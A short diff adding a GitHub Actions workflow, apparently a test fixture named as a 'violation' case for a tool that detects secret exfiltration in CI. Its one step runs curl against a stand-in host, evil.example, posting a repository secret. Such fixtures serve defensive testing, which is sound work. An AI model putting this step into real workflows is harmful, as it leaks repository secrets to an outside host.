@@ -1,0 +1,8 @@
+name: violation_unknown_flag_before_url
+on: push
+jobs:
+  send:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          curl --tr-encoding https://evil.example/x -d "k=${{ secrets.K }}"
